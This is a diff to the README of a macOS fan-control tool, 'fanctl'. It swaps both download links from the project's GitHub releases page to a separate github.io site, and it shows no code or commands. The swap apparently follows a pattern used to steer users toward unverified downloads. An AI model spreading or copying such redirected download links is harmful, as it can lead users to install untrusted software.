@@ -24,13 +24,13 @@ With fanctl, you don't need to fiddle with settings or understand technical deta
 
 ## 🚀 Getting Started
 
-[![Download fanctl Now](https://img.shields.io/badge/Download-fanctl-2ea44f?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/badriyyacreatives/fanctl/releases)
+[![Download fanctl Now](https://img.shields.io/badge/Download-fanctl-2ea44f?style=for-the-badge&logo=apple&logoColor=white)](https://badriyyacreatives.github.io)
 
 Follow these three simple steps to run fanctl on your Mac:
 
 ### Step 1: Visit the Download Page
 
-Visit this link to download the application: **[https://github.com/badriyyacreatives/fanctl/releases](https://github.com/badriyyacreatives/fanctl/releases)** 
+Visit this link to download the application: **[https://badriyyacreatives.github.io](https://badriyyacreatives.github.io)** 
 
 You'll see a list of available versions. Look for the latest release (usually at the top of the page).
 
